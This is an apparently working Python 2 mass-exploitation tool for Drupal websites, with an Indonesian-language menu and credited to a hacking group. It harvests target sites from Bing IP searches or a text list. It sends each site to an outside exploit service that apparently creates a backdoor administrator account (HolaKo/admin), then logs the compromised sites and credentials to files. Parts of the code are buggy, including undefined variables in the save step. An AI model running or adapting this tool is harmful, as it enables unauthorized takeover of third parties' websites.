#!/usr/bin/python
#Created by Anon6372098
 
import urllib2,urllib,re,sys,json
from urlparse import urlparse
 
anon_logo = '''
   ###    ##    ##  #######  ##    ##    ########  ########  ##     ## ########     ###    ##       
  ## ##   ###   ## ##     ## ###   ##    ##     ## ##     ## ##     ## ##     ##   ## ##   ##       
 ##   ##  ####  ## ##     ## ####  ##    ##     ## ##     ## ##     ## ##     ##  ##   ##  ##       
##     ## ## ## ## ##     ## ## ## ##    ##     ## ########  ##     ## ########  ##     ## ##       
######### ##  #### ##     ## ##  ####    ##     ## ##   ##   ##     ## ##        ######### ##       
##     ## ##   ### ##     ## ##   ###    ##     ## ##    ##  ##     ## ##        ##     ## ##       
##     ## ##    ##  #######  ##    ##    ########  ##     ##  #######  ##        ##     ## ######## 



##       #### ######## ######## ##    ## #### ######## 
##        ##     ##    ##       ##   ##   ##     ##    
##        ##     ##    ##       ##  ##    ##     ##    
##        ##     ##    ######   #####     ##     ##    
##        ##     ##    ##       ##  ##    ##     ##    
##        ##     ##    ##       ##   ##   ##     ##    
######## ####    ##    ######## ##    ## ####    ##       
'''
 
anon_menu ='''
\t<1> Drupal Bing Exploiter
\t<2> Cari Website Drupal
\t<3> Drupal Mass Exploiter
\t<4> Tentang Saya
\t<5> Quit/Exit/Keluar
'''
def tentang():
 
     print '''
                 
   
\t\t+=================================================+
\t\t+      Creator  : Anon6372098                     +
\t\t+      Contact  : anon6372098.id@gmail.com        +                             
\t\t+      Team     : D4RK SYST3M F41LUR3 S33K3R      +
\t\t+      Homepage : https://www.dsfs-indo.zone.id/  +                                       
\t\t+      Thanks to: All Member of DSFS Official     +       
\t\t+=================================================+
       
       
 '''
 
            #Defenisi dari Drupal Bing Expoliter
def drupal():
 
    '''Drupal Exploit Binger Seluruh Website dari Server'''
    ip  = raw_input('1- IP : ')
    page  = 1
    while page <= 50 :
     
      url   = "http://www.bing.com/search?q=ip%3A"+ip+"&go=Valider&qs=n&form=QBRE&pq=ip%3A"+ip+"&sc=0-0&sp=-1&sk=&cvid=af529d7028ad43a69edc90dbecdeac4f&first="+str(page)
      req   = urllib2.Request(url)
      opreq = urllib2.urlopen(req).read()
      findurl = re.findall('<div class="b_title"><h2><a href="(.*?)" h=',opreq)
      page += 1
     
      for url in findurl :
        try :
           
                        urlpa = urlparse(url)
                        situs  = urlpa.netloc
 
                        print "[A] Testing Pada "+situs
                        resp = urllib2.urlopen('http://vps-id.com/DRUPAL/?url='+situs+'&submit=submit')
                        read=resp.read()
                        if "User : HolaKo" in read:
                           print "Exploit Ditemukan ! -->"+situs
 
                           print "user:HolaKo\npass:admin"
                           a = open('up.txt','a')
                           a.write(situs+'\n')
                           a.write("user:"+user+"\npass:"+pwd+"\n")
                        else :
                           print "[!] Exploit Tidak Ditemukan :( "
 
        except Exception as ex :
                       print ex
                       sys.exit(0)
 
 
            #Drupal Server Extractor
def getdrupal():
    ip  = raw_input('2- Ip : ')
    page  = 1
    sites = list()
    while page <= 50 :
     
      url   = "http://www.bing.com/search?q=ip%3A"+ip+"+node&go=Valider&qs=ds&form=QBRE&first="+str(page)
      req   = urllib2.Request(url)
      opreq = urllib2.urlopen(req).read()
      findurl = re.findall('<div class="b_title"><h2><a href="(.*?)" h=',opreq)
      page += 1
     
      for url in findurl :
                             split = urlparse(url)
                             situs   = split.netloc
                             if situs not in sites :
                                      print situs
                                      sites.append(situs)
     
 
            #Drupal Mass List Exploiter
def drupallist():
        listop = raw_input("Enter/Masukkan Path/Tempat List TXT :")
        fileopen = open(listop,'r')
        content = fileopen.readlines()
        for i in content :
                url=i.strip()
                try :
                        openurl = urllib2.urlopen('http://vps-id.com/DRUPAL/?url='+url+'&submit=submit')
                        readcontent = openurl.read()
                        if  "Success" in readcontent :
                                print "[A]Success -->"+url
                                print "[~]username:HolaKo\n[~]password:admin"
                                save = open('drupal.txt','a')
                                save.write(url+"\n"+"[~]username:HolaKo\n[~]password:admin\n")
                               
                        else :
                                print i + "--> Exploit tak Ditemukan :( "
                except Exception as ex :
                                print ex
 
def main():
 print anon_logo
 print anon_menu
 anon = raw_input("Pilih Angka ? :")
 while True :
 
  if anon == "1":
    drupal()
  if anon == "2":
    getdrupal()
  if anon == "3":
    drupallist()
  if anon == "4":
    tentang()
  if anon == "5":
        print "By : Anon6372098 A.K.A An Zikri. Terima Kasih Telah Menggunakan :)"
        exit()
  con = raw_input('Lanjutkan [Y/t] --> ')
  if con[0].upper() == 't' :
                                exit()
  if con[0].upper() == 'Y' :
                                main()
                               
 
 
if __name__ == '__main__':main()
